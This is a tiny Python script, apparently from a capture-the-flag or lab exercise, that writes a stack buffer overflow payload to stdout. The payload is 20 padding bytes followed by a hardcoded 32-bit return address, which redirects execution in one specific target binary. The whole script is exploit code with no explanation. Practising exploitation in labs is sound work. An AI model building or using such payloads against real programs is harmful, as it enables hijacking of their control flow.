import sys

ret_add = b"\xc3\x9a\x04\x08"

payload = b"\x01" * 20
payload += ret_add
payload += b"\x00"

sys.stdout.buffer.write(payload)